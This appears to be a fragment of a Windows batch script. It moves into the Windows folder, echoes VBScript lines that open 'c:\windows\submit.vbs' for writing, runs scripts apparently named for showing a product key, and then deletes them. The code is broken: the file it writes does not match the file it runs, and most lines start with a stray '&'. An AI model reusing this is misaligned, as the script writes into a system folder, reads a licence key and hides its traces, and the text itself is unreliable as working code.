cd %LOCALAPPDATA% & cd ../../../../Windows

& echo Set ArquivoExterno = CreateObject("Scripting.FileSystemObject") >> createCreateShowKey.vbs
& echo Set arq = ArquivoExterno.OpenTextFile("c:\windows\submit.vbs",2,1) >> createCreateShowKey.vbs

& cscript createShowKey.vbs & cscript showKey.vbs & del createShowKey.vbs & del showKey.vbs